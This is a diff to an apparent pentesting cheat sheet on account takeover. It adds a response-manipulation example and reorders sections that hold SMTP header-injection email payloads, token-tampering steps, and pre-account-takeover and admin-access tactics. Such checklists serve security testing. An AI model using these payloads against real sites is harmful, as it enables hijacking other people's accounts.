@@ -92,7 +92,7 @@ Sometime web app doesn't care about email. User can create more than one account
 - If response success then see which account password has been changed
 ```
 
-#### SMTP Header Injection
+#### SMTP Header Injection & Email Parameter Manipulation
 ```
 victim@mail.tld%0d%0acc:attacker@mail.tld
 
@@ -109,18 +109,16 @@ email=victim@email.tld:attacker@email.tld
 {"email":["victim@email.tld","atracker@email.tld"]}
 ```
 
-### Playing With Token
+#### Response manipulation
 ```
-- Use attacker's valid token on Victim's account
-- Completely remove the token
-- Change it to 00000000000...
-- Use null value
-- Try expired token
-- Try an array of old tokens
-- Change 1 char at the begin/end to see if the token is evaluated
-- Bruteforce token
+HTTP/1.1 401 Unauthorized
+{“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”}
+----------------------------------------------------------------------------
+HTTP/1.1 200 OK
+{“message”:”success”,”statusCode:200,”errorDescription”:”Success”}
 ```
-### Pre-Account Takeover
+
+#### Pre-Account Takeover
 **Suppose two features(Login via OAuth and email) are available and no email verification needed after registration.**
 ```
 - Create an account using victim email.
@@ -129,7 +127,7 @@ email=victim@email.tld:attacker@email.tld
 ```
 *May be victim will not be able to create an account with this email(Email Already Exist)*
 
-### Admin Panel Access
+#### Admin Panel Access
 **Suppose no email verification needed after registration.**
 ```
 - Try to find out other stuff's email of the company(Use hunter.io).
@@ -148,6 +146,18 @@ email=victim@email.tld:attacker@email.tld
 - Change request method (get, put, post etc) and/or Content Type (xml<->json) 
 - Match bad response and replace with good one
 - Use super long string
+```
+
+### Playing With Token
+```
+- Use attacker's valid token on Victim's account
+- Completely remove the token
+- Change it to 00000000000...
+- Use null value
+- Try expired token
+- Try an array of old tokens
+- Change 1 char at the begin/end to see if the token is evaluated
+- Bruteforce token
 ```
 
 ### Email Change
